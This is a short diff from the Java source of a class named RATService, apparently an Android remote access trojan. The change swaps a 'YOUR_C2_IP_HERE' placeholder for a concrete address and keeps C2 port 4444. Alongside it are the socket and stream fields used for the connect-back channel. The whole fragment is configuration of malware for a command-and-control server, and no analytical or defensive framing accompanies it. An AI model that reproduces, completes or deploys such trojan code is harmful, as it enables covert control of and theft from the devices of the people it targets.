@@ -19,7 +19,7 @@ public class RATService extends Service {
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
-    private String serverIp = "YOUR_C2_IP_HERE";  // CHANGE THIS
+    private String serverIp = "192.168.11.101";  // CHANGE THIS
     private int serverPort = 4444;
 
     @Override
